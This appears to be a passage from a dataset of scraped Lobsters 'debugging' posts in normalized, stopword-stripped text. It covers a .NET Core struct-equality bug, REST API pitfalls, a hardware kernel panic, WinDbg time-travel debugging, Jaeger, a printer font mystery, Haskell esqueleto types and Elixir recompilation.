example usually try take one project time could gone either way time decided remove testing first repo created new console application project reference production code moved operator part equality tester code programcs simplified slightly introduced assert class true false method printed result ready run using system using systemreflection using googlecloudfirestoredata class program static void main string args var new geopoint var new geopoint assertequalityoperators internal static void assertequalityoperators control equal var typeinfo typeof gettypeinfo var equalitymethodinfo typeinfogetmethod opequality new typeof typeof func bool equality lh rh bool equalitymethodinfoinvoke null new object lh rh asserttrue equality control equal class assert public static void true bool actual consolewriteline expected true actual public static void false bool actual consolewriteline expected false actual sure enough output show problem expected true false great let remove step remove production code dependency rather copy whole geopoint test project created small test struct similar equality code deadend single double value made mistake changed much one go reduced test struct one double field using system using systemreflection class program static void main string args test new test test new test var equalitymethodinfo typeof test getmethod opequality new typeof test typeof test func test test bool equality lh rh bool equalitymethodinfoinvoke null new object lh rh consolewriteline consolewriteline equality consolewriteline equalitymethodinfoinvoke null new object struct test iequatable test private readonly double value public test double value thisvalue value public static bool operator test lh test rh lhsvalue rhsvalue public static bool operator test lh test rh lh rh public override bool equal object obj obj test equal public bool equal test public override int gethashcode valuegethashcode print true three time like eventually mean reproducing problem want back reproducing two double value taking one step back towards previous code went back two double value instead one expanding test struct like struct test iequatable test private readonly double x private readonly double public test double x double thisx x thisy public static bool operator test lh test rh lhsx rhsx lhsy rhsy public static bool operator test lh test rh lh rh public override bool equal object obj obj test equal public bool equal test public override int gethashcode xgethashcode ygethashcode change constructor call test bingo print true false false step explore scope problem tried exact code window unsurprisingly given earlier unit test passed reproduce problem sticking linux still try multiple framework multiple build configuration like say prompted try different framework intuition hard explain unfortunately let change project file bit project sdk microsoftnetsdk propertygroup outputtype exe outputtype targetframeworks targetframeworks propertygroup project run several different configuration remember three true line mean everything working true false false mean problem investigating dotnet run c debug f true false false dotnet run c release f true false false dotnet run c debug f true true true dotnet run c release f true true true dotnet run c debug f true true true dotnet run c release f true true true fails net core work net core net core certainly make sound like net core bug mean want give point entirely possible user using net core want code work given majorminor version number partly good handle different part net core linux find version number package got installed listed installed installed installed automatic dotnetruntime package believe part instead step look failed comparison part really simple add diagnostics method public static bool operator test lh test rh consolewriteline lh lhsx lhsy rh rhsx rhsy consolewriteline lhsx rhsx lhsy rhsy return lhsx rhsx lhsy rhsy thing get really interesting output lh rh true true true lh rh true false false lh rh true false false first three line expected working comparison threelinesegments second third comparison show first field x fine second tiny double value inconsistent step try fail simplify maybe boxing blame try really simple version boxing override tostring box value see come change test simply public override string tostring x test object x new test consolewriteline x print appears boxed correctly step try simplifying bit le failing program two potential complication play boxing value calling method via reflection boxing problem maybe reflection decided try two thing instance method static method accepting test parameter like operator comparison get rid lot code new complete code using system using systemreflection class program static void main string args test new test var foo typeof test getmethod foo fooinvoke null var bar typeof test getmethod bar barinvoke null new object struct test private readonly double x private readonly double public test double x double thisx x thisy public void foo consolewriteline x public static void bar test consolewriteline tx ty result interesting point lot thing could check affect parameter happen field type primitive reference provoke circumstance via reflection probably answered finding existing issue fixed reasonably feasible given open source nature net core wait though sunday evening let see fix problem first step fix stroke luck given feel like memory management issue let try something basically used explicit struct layout struct containing two double field pretty easy lay field offset right admittedly also sound like easy clr get right least laying explicitly lowrisk using systemruntimeinteropservices structlayout layoutkindexplicit struct test fieldoffset private readonly double x fieldoffset private readonly double normally thing get fixed first attempt worked backtracking simplification standalone comparison version fixing geopoint involved using automatically implemented property want apply attribute field property boo checking work locally adding commit pr seeing pas travis yay next step point note next step definitely try find history issue surprisingly big problem affect ga net core runtime expect record somewhere want understand better wrong whether fix appropriate whether need apply elsewhere update still issue runtime apparently even daily build filed issue look forward seeing happens interesting aspect initially see problem ci top priority reproduce locally ever remove much code production code test code dependency handy multiple execution environment available local linux box would nightmare try different configuration different runtimesframeworks sometimes bug really runtime bcl pretty rare happen like like loading related
387,Lobsters,debugging,Debugging,Falsehoods Programmers Believe about REST APIs,http://slinkp.com/falsehoods-programmers-believe-about-apis.html,falsehood programmer believe rest apis,falsehood programmer believe falsehood programmer believe time assumption wrong documentation error least surprise moving fast breaking stuff bug report,spirit falsehood programmer believe favorite probably falsehood programmer believe time offer working thirdparty rest apis believe bit strong word belief deep thing resistant change like assumption wish crumble first contact api true apis worked true apis interacted hopefully useful list pitfall mindful creating documenting apis hard client assumption wrong documentation common feature public application available api person implementing client already expert user application okay implementor know something application okay implementor least heard application okay implementor least know something problem solved application jargon userfacing application terminology concept api counterexample api documentation glossary application jargon used documentation say legal value posting resource b found get resource returned value work b documentation old version system preserved similarsounding concept system difference well explained somewhere would nt tag topic term leave guess mean error successful status always successful status always one documented status response indicates success api documented returning error json format always return parseable json error response rate limit rate limit error message format documented matter error code emitted system documented least surprise resource accepts post request whose path end json expects jsonencoded body obviously auth done common standard oauth oauth use commonly available thirdparty oauth library authentication work wo nt stop working one day documentation say upload mb png image expect png image mb wo nt cause error moving fast breaking stuff breaking change confined explicit version api explicit version api feature wo nt disappear version n version released backwards incompatible change announced long deployed well least week okay least documentation breaking change occurred sometime deploying change would nt update doc pretend old spec never existed announcement breaking change announced thing break announcement breaking change explicitly call change changed wo nt dump entire new documentation okay announcement dump entire new documentation least text format run diffs okay announcement dump binary format least format copypaste text generate diffs would nt use weird pdf generator insert bizarro invisible whitespace random character within word bug report file bug report get official response acknowledging bug get fixed eventually file bug report get official response acknowledging bug say removing feature next version instead fixing least update doc old api version reflect breaking change somewhere report bug client application requires approval use restricted paid feature possible get approval without putting client production
388,Lobsters,debugging,Debugging,Why does punching Sonic 3D trigger a Secret Level Select?,https://www.youtube.com/watch?v=i9bkKw32dGw,punching sonic trigger secret level select,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature punching sonic trigger secret level select youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature punching sonic trigger secret level select youtube
389,Lobsters,debugging,Debugging,Debugging a Hardware Panic,http://blog.alicegoldfuss.com/debugging-hardware-panic/,debugging hardware panic,debugging hardware panic fatal hardware error guide pretty good protip esm log futureproofing,debugging hardware panic server rebooted perhaps lucky developer work whenever host reboots always think hardware failure first treated case differently jumped onto host run quick diagnostics since deal dell equipment first stop always checkopenmanage give quick report cpu dimms chassis power supply etc command line take second run rarely fails however time everything returned ok hardware failure doublechecked claim idrac case one time history gui correct module running directly box nope everything green loaded kernel dump fatal hardware error plenty guide setup run crash reading blog post assume already got far guide pretty good course configured system record dump first place take lesson learned asap ran crash dump spat kernel release version smp wed apr utc machine mhz memory gb panic kernel panic syncing fatal hardware error fatal hardware error something failed diagnostics agree spent next several hour weed running bt give stack trace active task time panic crash bt pid task cpu command swapper machinekexec crashkexec panic ghesnotifynmi notifiercallchain atomicnotifiercallchain notifydie donmi nmi exception rip rip rsp rflags rax rbx rcx rdx rsi rdi rbp origrax ffffffffffffffff c s nmi exception stack intelidle cpuidleidlecall cpuidle case failure happened driver method intelidle offset usually decompile kernel code throw server away go back sleep found code online instead intelidle driver force cpu lowest activity level use instead keeping core warm meant boost energy efficiency hardware care performance hit case looked like method failed store cpu state reason causing panic however server running seemed oneoff machine goblin occurrence except hour later crashed fatal hardware error time yet everything coming ok failing intelidle driver ran host without issue breaking protip trust kernel esm log let cut chase issue find secret esm log esm stand embedded system management sometimes known system event log log every hardwarelevel event even harmless one showed critical failure host find turn engineer completely different team seen esmlog show dmesg one day know learning happened pick troubled host investigate curiosity awesome omreport system esmlog severity critical date time description bus fatal error detected component bus device function bus device function refers location pci dig lspci lspci pci bridge intel corporation xeon pci express root port rev failure pci intelidle failure made sense process unable share state across bus also run super detailed command device location lspci vvxs gave among many thing pci bridge renesas technology corp pcie switch p progif normal decode put request new pcie switch futureproofing debugged kernel panic gap diagnostics looking wrong place hour prevent happening get esm log data checkopenmanage command included default log noisy however wanted visibility log wrote custom nrpe check poll esm log port nagios give detail failure critical event host also page people failure bad enough host reboots know anyway check going page developer work root access deep system knowledge nagios logins would much prefer getting page say server rebooted see critical esm log message nagios v server rebooted lol idk proper alerting art needed esm log monitoring yet finger crossed glad developer access anyway future wishlist includes writing automation clear esm log period time fresh event appear otherwise need manually clear log incident hope post helpful go back bed
390,Lobsters,debugging,Debugging,Time Travel Debugging in WinDbg Preview!,https://blogs.msdn.microsoft.com/windbg/2017/09/25/time-travel-debugging-in-windbg-preview/,time travel debugging windbg preview,time travel debugging windbg preview article time travel debugging available windbg preview windbg preview windbg preview ttd record replay analyze getting started install http akamswindbgpreview feedback http insiderwindowscomenushowtofeedback windbgfb question documentation enuswindowshardwaredriversdebuggertimetraveldebuggingoverview blog http blogsmsdnmicrosoftcomwindbg video defrag tool defrag tool youtube cppcon use ttd record trace file start debugging enuswindowshardwaredriversdebuggertimetraveldebuggingoverview replay trace basic ttd command enuswindowshardwaredriversdebuggertimetraveldebuggingoverview command description p p g g tt position position final thought,time travel debugging windbg preview minute read article time travel debugging available windbg preview excited announce time travel debugging ttd feature available latest version windbg preview month ago released windbg preview provides great new debugging user experience publicly launching preview version ttd first time looking forward feedback ttd would nt great go back time fix problem ca nt help go back time fix poor life choice help go back time fix code problem time travel debugging ttd reverse debugging solution allows toâ recordâ execution app process replay forwardsâ backwards use query search entire traceâ today debugger typically allow start specific point time go forward ttdâ improves debugging since go back time better understand condition lead bug also replay multiple time learn best fix problem ttd easy record record app process machine reproduce bug creates trace file run extension information reproduce bug replay open trace file windbg preview replay code execution forward backward many time necessary understand problem analyze run query command identify common code issue full access memory local understand going getting started know excited ready start using ttd thing know get started install use ttd installing windbg preview build greater store window anniversary update newer http akamswindbgpreview feedback preview release ttd counting feedback continue finish product using feedback hub help u prioritize improvement make easily provide feedback directly windbg preview clicking feedback hub button home ribbon otherwise open feedback hub start select category developer platform subcategory debugging tool window windbg kd cdb ntsd window insider website great overview give good feedback http insiderwindowscomenushowtofeedbackâ also email u windbgfb question expect question work ttd feel free post blog send feedback hub best answer posting ttd faq blog shortly documentation got initial documentation enuswindowshardwaredriversdebuggertimetraveldebuggingoverview improving content based upon customer feedback usage give u feedback propose edits docsmicrosoftcom documentation hitting comment edit page blog watch indepth ttd update tip future team blog http blogsmsdnmicrosoftcomwindbg video went channel studio recorded couple episode defrag tool help explain basic ttd windbg preview defrag tool ivette jamesp go basic ttd demo featuresâ windbg preview defrag tool jordi jcab demo great feature ttd windbg preview youtube cppcon jordi ken jamesm presented ttd windbg preview cppcon coming soon stay tuned video show power query using ttd object model use ttd use ttd directly windbg preview app added key ttd feature windbg preview provide familiar debugging experience make intuitive go backwards forward time debugging session record trace windbg preview make easy record trace simply click file start debugging point app process option record attach launch see enuswindowshardwaredriversdebuggertimetraveldebuggingoverview information replay trace trace complete automatically load index trace faster replay memory lookup simply use windbg ribbon button command step forward backwards code basic ttd command use ribbon enter following ttd command windbg preview see enuswindowshardwaredriversdebuggertimetraveldebuggingoverview complete list ttd command command description p step forward p step backwards g go forward g go backwards trace forward trace backwards tt position travel given position trace percentage using xx yy position code position display current position every thread â final thought excited get ttd hand developer thing remember ttd preview regularly improving performance feature run window since windbg preview store app see docsmicrosoftcom documentation ttd known issue compatibility welcome world time travel goal improve life developer making debugging easier increase product quality please send u feedback feature request feedback hub let u know
391,Lobsters,debugging,Debugging,Jaeger - a Distributed Tracing System,https://github.com/jaegertracing/jaeger,jaeger distributed tracing system,jaeger distributed tracing system dapper openzipkin uber technology cloud native computing foundation cloud native computing foundation jaeger incubation announcement jaeger graduation announcement get involved idea feature high scalability native support opentracing opentracing standard span reference opentelemetry opentracing opencensus project announced opentelemetry jaeger opentelemetry multiple storage backends badger modern web ui cloud native deployment kubernetes template helm chart observability prometheus zap security http githubcomjaegertracingsecurityaudits issue backwards compatibility zipkin related repository documentation instrumentation library deployment component building source contributing contributing contributing maintainer jaegertracing project status biweekly meeting agenda meeting detail roadmap http wwwjaegertracingiodocsroadmap question discussion bug report adopter adoptersmd survey issue license apache license,jaeger distributed tracing system jaeger inspired dapper openzipkin distributed tracing platform created uber technology donated cloud native computing foundation used monitoring microservicesbased distributed system distributed context propagation distributed transaction monitoring root cause analysis service dependency analysis performance latency optimization see also jaeger hosted cloud native computing foundation cncf toplevel project graduated october company want help shape evolution technology containerpackaged dynamicallyscheduled microservicesoriented consider joining cncf detail involved jaeger play role read cncf jaeger incubation announcement jaeger graduation announcement get involved jaeger open source project open governance welcome contribution community love help improve extend project idea get involved many even require coding feature high scalability jaeger backend designed single point failure scale business need example given jaeger installation uber typically processing several billion span per day native support opentracing jaeger backend web ui instrumentation library designed ground support opentracing standard represent trace directed acyclic graph tree via span reference support strongly typed span tag structured log support general distributed context propagation mechanism via baggage opentelemetry opentracing opencensus project announced intention merge new cncf project called opentelemetry jaeger opentelemetry project different goal opentelemetry aim provide apis sdks multiple language allow application export various telemetry data process number metric tracing backends jaeger project primarily tracing backend receives tracing telemetry data provides processing aggregation data mining visualization data jaeger client library overlap opentelemetry functionality opentelemetry natively support jaeger tracing backend eventually might make jaeger native client unnecessary information please refer blog post jaeger opentelemetry multiple storage backends jaeger support two popular open source nosql database trace storage backends cassandra elasticsearch also embedded database support using badger ongoing community experiment using database scylladb influxdb amazon dynamodb jaeger also ship simple inmemory storage testing setup modern web ui jaeger web ui implemented javascript using popular open source framework like react several performance improvement released allow ui efficiently deal large volume data display trace ten thousand span eg tried trace span cloud native deployment jaeger backend distributed collection docker image binary support various configuration method including command line option environment variable configuration file multiple format yaml toml etc deployment kubernetes cluster assisted kubernetes template helm chart observability jaeger backend component expose prometheus metric default metric backends also supported log written standard using structured logging library zap security thirdparty security audit jaeger available http githubcomjaegertracingsecurityaudits please see issue summary available security mechanism jaeger backwards compatibility zipkin although recommend instrumenting application opentracing api binding jaeger client library benefit advanced feature available elsewhere organization already invested instrumentation using zipkin library rewrite code jaeger provides backwards compatibility zipkin accepting span zipkin format thrift json http switching zipkin backend matter routing traffic zipkin library jaeger backend related repository documentation instrumentation library deployment component building source see contributing contributing see contributing maintainer official maintainer jaeger project please use jaegertracingjaegermaintainers tag issue pr repository jaegertracing org additional maintainer project status biweekly meeting jaeger contributor meet biweekly everyone welcome join agenda meeting detail roadmap see http wwwjaegertracingiodocsroadmap question discussion bug report reach project contributor via channel adopter jaeger product consists multiple component want support different type user whether using instrumentation library full end end jaeger installation whether run production use troubleshoot issue development please see adoptersmd organization using jaeger today would like add organization list please comment survey issue license apache license
392,Lobsters,debugging,Debugging,EuroBSDcon 2017 System Performance Analysis Methodologies,https://www.slideshare.net/brendangregg/eurobsdcon-2017-system-performance-analysis-methodologies,eurobsdcon system performance analysis methodology,user agreement privacy policy privacy policy user agreement,slideshare us cooky improve functionality performance provide relevant advertising continue browsing site agree use cooky website see user agreement privacy policy slideshare us cooky improve functionality performance provide relevant advertising continue browsing site agree use cooky website see privacy policy user agreement detail
393,Lobsters,debugging,Debugging,How I Fixed a 10 Year Old Guitar Hero Bug Without the Source Code,https://www.youtube.com/watch?v=A9U5wK_boYM,fixed year old guitar hero bug without source code,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature fixed year old guitar hero bug without source code youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature fixed year old guitar hero bug without source code youtube
394,Lobsters,debugging,Debugging,"Sysadmin war story: “The network ate my font""",http://verticalsysadmin.com/blog/sysadmin-war-story-the-network-ate-my-font/,sysadmin war story network ate font,micr wikipedia usenix lisa setting cicd pipeline shell basic hood git foundation gitlab ci time management system administrator email,year ago unix sys admin factory asked help network issue hit help desk problem explained network eating micr font magnetic ink character recognition machinereadable font check look last line check image example micr font image credit wikipedia finance office toronto printing check printer toronto hollywood california check coming ok toronto hollywood bank routing number account number printed regular font instead micr font toronto printer printing number micr said way network eating micr font network work show check sure enough account number routing number check number regular font asked toronto office fax check printed micr font check mind asked guy responsible maintaining finance system anything changed recently problem started sure change real headscratcher ended capturing postscript check using tcpdump printed toronto unix server running finance system printer hollywood poured dump found postscript image referencing font font included image ever work digging bit deeper finance tech guy yes checkbox check editor whether encapsulate bundle font image default every time go edit check box unchecked however last time check image edited month ago stop working guess turn printer cache font using font cached earlier check image included font moreover toronto hollywood office different printer maintenance schedule part maintenance printer rebooted clear font cache confirm rebooted toronto printer stopped printing micr font check resolution edit check image check include font checkbox san francisco bay area next month drop usenix lisa conference next month hear great war story teach setting cicd pipeline colleague mike weilgart also teach shell basic hood git foundation gitlab ci time management system administrator email ask training staff
396,Lobsters,debugging,Debugging,Debugging Types: A Stream of Thought,http://www.parsonsmatt.org/2017/09/13/debugging_types_a_stream_of_thought.html,debugging type stream thought,debugging type stream thought fine ghibli tune hoogle result type signature modifying esqueleto patch esqueleto hoogle give u top result extending class sigh type inference rule hackage doc sqlbackendcanread,debugging type stream thought sep day job got whole bunch database model somewhat easy accidentally query wrong database fortunately persistent mechanism fixing using typespecific backends however persistent mechanism designed around sort use case work around wrote wrapper library called persistenttypeddb enable type safe access almost entirely vendored code persistent phantom type variable database accessing got work integrating library work codebase ran bunch road block part debugging process work started writing streamofthought happens debugging log tremendously helpful sharing workflow thought process path dead end typically make way process documentation since debugging workflow mostly open source stuff esqueleto persistent wrapper library figured post entire flow mostly streamofthought direction great pretty closely mirror work research solve problem best accuracy read along listening fine ghibli tune persistenttypeddb library allow u type safety running database query accidentally issue texastoast account query fbg master database example library need compatible persistent esqueleto useful currently persistenttypeddb persistent great persistenttypeddb esqueleto incompatible persistenttypeddb incompatible esqueleto let dig error receive error could nt match type databasepersisttypedsqlfor texacctdb sqlbackend arising use expression v leftouterjoin v v venueid v venuesettingvenue pure v v equation venuewithsettings venuewithsettings v leftouterjoin v v venueid v venuesettingvenue error come code venuewithsettings sqlquery sqlexpr entity venue sqlexpr maybe entity venuesetting venuewithsettings v leftouterjoin v v venueid v venuesettingvenue pure v v error indicates ghc trying unify sqlfor texacctdb sqlbackend due use type specifying sqlbackend dig esqueleto find line databaseesqueletointernallanguage query expr backend query b query b need know internal class implement tuple magic see fromstart class esqueleto query expr backend query expr backend query class explains select value type using query instance esqueleto class need dig esqueleto class identify coercing backend class definition esqueleto class functor query applicative query monad query esqueleto query expr backend query expr backend expr query backend arrow class definition functional dependency simpler example guy class container container element container element tolist container element instance container tolist id instance container set tolist settolist instance container text char tolist textunpack class instance say given type container element type container fully determined container set element type container type polymorphic text element type fixed char back esqueleto class definition functional dependency state type query enough select type expr backend type expr sufficient select type query backend practically mean one instance given query expr type may vary backend reuse queryexpr type type signature venuewithsettings fix type sqlquery sqlexpr venuewithsettings sqlquery sqlexpr entity venue sqlexpr maybe entity venuesetting tell ghc also unambiguously select backend sqlbackend complain backend sqlbackend must asking ghc persistentitybackend record line sqlbackend throw type error unfortunately ghc type checker include stepthrough debugger prod manually replaced type signature polymorphic one cause compiler defer making selection bit might give u clue proceed venuewithsettings esqueleto q e b q e entity venue e maybe entity venuesetting query expression backend polymorphic attempt compile get error error could nt match type databasepersisttypedsqlfor texacctdb sqlbackend arising use select first argument namely select second argument namely select venuebyid expression fmap convert select venuebyid one suggests select responsible selecting sqlbackend make note investigate next error could nt match type databasepersisttypedsqlfor texacctdb sqlbackend arising use select second argument namely select venuewithsettings expression tolist convert select venuewithsettings equation getvenueswithsettings getvenueswithsettings tolist convert select venuewithsettings convert entity venue maybe entity venuesetting map key venue entity venue map text maybe text convert fmap fmap venuesettingstomap fmap entityval foldr evenue evenuesetting mapinsertwith ev entitykey evenue evenue maybetolist evenuesetting mapempty appears thing select seems looking record backend complaining type line error overlapping instance databaseesqueletointernallanguagefrompreprocess q e b e entity venue arising use matching instance instance esqueleto query expr backend persistentity val persistentitybackend val backend databaseesqueletointernallanguagefrompreprocess query expr backend expr entity val defined databaseesqueletointernallanguage instance esqueleto query expr backend databaseesqueletointernallanguagefrompreprocess query expr backend databaseesqueletointernallanguagefrompreprocess query expr backend b databaseesqueletointernallanguageisjoinkind join databaseesqueletointernallanguagefrompreprocess query expr backend join b defined databaseesqueletointernallanguage choice depends instantiation q b e pick first instance use incoherentinstances compiling instance declaration expression v leftouterjoin v v venueid v venuesettingvenue pure v v equation venuewithsettings venuewithsettings v leftouterjoin v v venueid v venuesettingvenue error mention databaseesqueletolanguagefrompreprocess familiar need look also complaining first instance mentioned look promising instance esqueleto query expr backend persistentity val persistentitybackend val backend databaseesqueletointernallanguagefrompreprocess query expr backend expr entity val defined databaseesqueletointernallanguage instance requires esqueleto query expr backend satsified val persistentity persistentitybackend val backend esqueleto solve type class instance unless record backend instance esqueleto know force sqlexpr sqlquery sqlbackend thanks functional dependency also fundeps lazy like k back issue select let look type select sqlselect r monadio sqlquery sqlreadt r alright select also taking sqlquery force expr sqlexpr backend sqlbackend appear using backend type specifically yet sqlreadt quick hoogle search get result point type signature type sqlreadt forall backend sqlbackendcanread backend readert backend type signature abstracting backend saying query work backends provided backend instance sqlbackendcanread give sqlfor type instance sqlbackendcanread set select appear care record let look problem instance esqueleto query expr backend persistentity val persistentitybackend val backend databaseesqueletointernallanguagefrompreprocess query expr backend expr entity val instance saying given instance esqueleto query expr backend instance persistentity val requiring persistentitybackend val type backend provide instance frompreprocess open stack ghci texastoastmodels ask type persistentitybackend venue λ kind persistentitybackend venue persistentitybackend venue databasepersisttypedsqlfor texacctdb exactly problem need provide alternative way esqueleto mostly need accept two backends compatible sqlfor compatible sqlbackend even replace persistentitybackend val backend backendcompatible val backend suitable definition backendcompatible fix issue modifying esqueleto prepared patch esqueleto added class instance class backendcompatible sup sub instance backendcompatible sqlbackend sqlbackend instance backendcompatible sqlbackend sqlreadbackend instance backendcompatible sqlbackend sqlwritebackend texastoastmodels repository added instance instance backendcompatible sqlbackend sqlfor txmasterdb instance backendcompatible sqlbackend sqlfor txacctdb replaced persistentitybackend val backend constraint library backendcompatible backend persistentitybackend val solved issue frompreprocess however still getting error error could nt match type databasepersisttypedsqlfor texacctdb sqlbackend arising use select first argument namely select second argument namely select venuebyid expression fmap convert select venuebyid error could nt match type databasepersisttypedsqlfor texacctdb sqlbackend arising use select second argument namely select venuewithsettings expression tolist convert select venuewithsettings equation getvenueswithsettings getvenueswithsettings tolist convert select venuewithsettings convert entity venue maybe entity venuesetting map key venue entity venue map text maybe text convert fmap fmap venuesettingstomap fmap entityval foldr evenue evenuesetting mapinsertwith ev entitykey evenue evenue maybetolist evenuesetting mapempty stuff select somehow trying make backend sqlbackend instead sqlfor texacctdb let dig implementation select select sqlselect r monadio sqlquery sqlreadt r select query re rawselectsource select query conn rask liftio re flip rrunreadert conn runsource delegate rawselectsource answer rawselectsource sqlselect r monadio monadio mode sqlquery sqlreadt acquire csource r rawselectsource mode query conn persistbackend rask re run conn return c massage fmap re call persistbackend ask persistbackend hoogle give u top result method haspersistbackend class take value type basebackend return basebackend type work sqlreadbackend sqlwritebackend backends simply sqlbackend good persistent library really want basebackend backend persistentitybackend record want type safety basebackend backend sqlfor dbname persistentitybackend record record care need change method something grab sqlbackend whatever passed extending class class introduced esqueleto provides natural way solve rather use persistbackend return basebackend add new method projectbackend return large backend smaller backend compatible backwardscompatibly fix issue extended class class backendcompatible sup sub projectbackend sub sup instance backendcompatible sqlbackend sqlbackend projectbackend id instance backendcompatible sqlbackend sqlreadbackend projectbackend unsqlreadbackend allows u acquire sqlbackend compatible backend definition select friend also changed select sqlselect r monadio sqlbackendcanread backend backendcompatible sqlbackend backend sqlquery rreadert backend r select query re rawselectsource select query conn rask liftio re flip rrunreadert conn runsource rawselectsource sqlselect r monadio monadio sqlbackendcanread backend backendcompatible sqlbackend backend mode sqlquery rreadert backend acquire csource r rawselectsource mode query conn projectbackend rask let conn sqlbackend re run conn return c massage fmap re select mostly needed change constraint backend type beforehand using sqlbackendcanread backend readert backend r using provided also constrained backend compatible sqlbackend rawselectsource constraint difference also need use projectbackend instead persistbackend convert backend want sigh unfortunately still running issue error output get change library error could nt match type databasepersisttypedsqlfor texacctdb sqlbackend arising use select first argument namely select second argument namely select venuebyid expression fmap convert select venuebyid error could nt match type databasepersisttypedsqlfor texacctdb sqlbackend arising use select second argument namely select venuewithsettings exactly problem generalizing constraint give type inference rule whenever haskell type confusing helpful blow type signature away see ghc come deleted type signature throwing error asked ghc thought type ghc helpfully gave following warning wmissingsignatures toplevel binding type signature getvenuebyid basebackend backend sqlbackend persistuniqueread backend persistqueryread backend ispersistbackend backend databaseesqueletointernallanguagebackendcompatible sqlbackend backend monadio venueid readert backend maybe entity venue map text maybe text warning wmissingsignatures toplevel binding type signature getvenueswithsettings basebackend backend sqlbackend persistuniqueread backend persistqueryread backend ispersistbackend backend databaseesqueletointernallanguagebackendcompatible sqlbackend backend monadio readert backend entity venue map text maybe text ah hah synonym sqlbackendcanread must carrying around basebackend backend sqlbackend constraint borking indeed hackage doc sqlbackendcanread show constraint alias alias issqlbackend persistqueryread persiststoreread persistuniqueread issqlbackend also alias type issqlbackend backend ispersistbackend backend basebackend backend sqlbackend well issue need unwrap alias toss basebackend requirement instead use backendcompatible class q
397,Lobsters,debugging,Debugging,Understanding Elixir's recompilation,http://milhouseonsoftware.com/2016/08/11/understanding-elixir-recompilation/,understanding elixir recompilation,understanding elixir recompilation edit tl dr xerpa github understanding recompilation need happen already great explaining finding recompiled finding thing recompiled xref xerpa documentation compiletime dependency created module seen macro expansion actually inside runtime impact library code issue jaserializer using structs syntax import require ing module even macroexpanding implementing protocol using behaviour defining bug file defined module attribute change book trick used untangle realworld code base general advice safe kosaraju erlc,understanding elixir recompilation aug understandingelixirrecompilation edit presented much uptodate version blogpost elixirconf check tl dr recently xerpa became victim annoying problem whenever change file elixir project would faced recompilation file lot struggle able solve mess post explains problem describes hack technique used solve excerptseparator massive recompilations started consume lot time morale team started crusade solve make everyone life happier next section describe recompilation happens process tool used untangle codebase avoid massive recompilations seeing example post available github understanding recompilation need happen although elixir runtime semantics identical erlang compilation behavior quite different since erlang offer limited metaprogramming codegeneration capability occasion recompilation necessary one design goal elixir bring metaprogramming erlangland elixir via feature called macro get detail macro people much smarter already done great work explaining still basic understanding elixir macro work difficult time groking rest post order understand relationship macro compilation dependency consider following module definition aex defmodule require b def bmacro end bex defmodule b def remotecall cc defmacro macro x remotecall quote unquote x else quote unquote x end end end cex defmodule c def c end b code change need reevaluate macro expanding part compilation relationship b called compiletime dependency important somewhat tricky fact need understand arbitrary code executed macroexpansion time whenever macrodefining module one dependency change macrodependant module need recompiled macro expansion module code equivalent defmodule def end end imagine change c code following defmodule c def c end end would imply expansion defmodule def end end mean whenever c change need recompile notice b need recompiled previous example indicates runtime dependency module depend compiletime become compiletime dependency compile b z implies compile z since elixir metaprogramming feature based macro fact big deal finding recompiled one tool help verify understand behavior described previously inotify debugging recompilation problem app used following command inotifywait rm e modify builddev grep myappnameebin beam inotifywait output line stdout describing change file given path following described example previous section see something like inotifywait rm e modify builddev grep comptestebin beam setting watch beware since r given may take watch established builddevlibcomptestebin modify elixircbeam builddevlibcomptestebin modify elixirabeam great give insight actually happening rug finding thing recompiled elixir approach similar described previous section available debug understand recompilation behavior elixir compiler fortunately elixir equipped mix nice tool called xref among thing xref give task generates dependency graph elixir application reason updated elixir xerpa get dependency graph system following command mix xref graph format dot generated output file previous example would digraph xref graph libaex libaex libbex label compile libbex libcex see compiletime dependency aex cex readily visible output even though exists able verify previous section narrow shown graph via sink source option check xref documentation description actual output graph project xerpa edge imagine hurt trying make sense xref inotifywait basically used validate progress effort next session describe occasion compiletime dependency created compiletime dependency created module seen macro expansion whenever module seen evaluating macro expansion phase compilation compiletime dependency created regardless whether actually call anything seen module seen mean module participates body macro prior expansion take note module happens inside quoted block macrodefining module depend example consider following code compiledepex defmodule compiledep def x end runtimedepex defmodule runtimedep def x end usesmacroex defmodule usesmacro require macroz def macrozmacro end def c macrozmacronodepend end end macrozex defmodule macroz defmacro macro x compiledepx quote unquote x end else quote unquote x end end end defmacro macronodepend quote runtimedepa end end end running xref yield digraph xref graph libcompiledepex libruntimedepex libmacrozex libmacrozex libcompiledepex libusesmacroex libusesmacroex libmacrozex label compile libusesmacroex libruntimedepex see usesmacro compiletime dependency macroz runtime dependency runtimedep macroz depend runtimedep mean runtimedepex change usesmacroex macrozex would recompiled impact library code reason define association ecto module defining association compiletime dependency associated one schemaaex defmodule schemaa use ectoschema schema tablea belongsto b schemab end end schemabex defmodule schemab use ectoschema schema tableb field lol string end end running xref yield digraph xref graph libschemaaex libschemaaex libschemabex label compile libschemabex ended issue ecto github repository similar issue library like jaserializer beware providing module reference macro using structs syntax whenever use mystruct add compiletime dependency happens key passed building struct way checked compiletime struct definition struct definition change check would need reexecuted following code structaex defmodule structa defstruct field end bex defmodule b def b structa field end end running xref yield digraph xref graph libstructaex libbex libstructaex label compile libbex import require ing module whenever require import module establish compiletime dependency necessary reason outlined previous bullet point imported module use function even macroexpanding following code aex defmodule def yolo end importsaex defmodule importsa import end running xref yield digraph xref graph libaex libimportsaex libimportsaex libaex label compile implementing protocol implementing protocol file defines compiletime dependency protocol module following code structaex defmodule structa defstruct lol haha end protocolzex defprotocol protocolz def x end implzex defimpl protocolz structa def x end dependsonprotocolzex defmodule dependsonprotocolz def encode x protocolzx x end end running xref yield digraph xref graph libimplzex libimplzex libprotocolzex label compile libimplzex libstructaex label compile libprotocolzex libstructaex libdependsonprotocolzex libdependsonprotocolzex libprotocolzex notice using protocol imply compiletime dependency behaviour behaviour behave like protocol module implement behaviour compiletime dependency behaviorzex defmodule behavs use behaviour defcallback stuff stringt end usebehavsex defmodule usebehavs behaviour behavs def stuff x x end running xref graph yield digraph xref graph libbehaviorzex libusebehavsex libusebehavsex libbehaviorzex label compile surprise defining typespecs using type defined another module typespec also configures compiletime dependency typeaex defmodule typea type end typebex defmodule typeb spec b typeat def b end running xref yield digraph xref graph libtypeaex libtypebex libtypebex libtypeaex label compile unexpected think limit lot benefit typespecs large edit ended bug elixir compiler notice using special struct syntax typespec still configure compiletime dependency file defined externalresource module attribute change externalresource module attribute convenience allows tell elixir compiler recompile given module whenever file change externalex 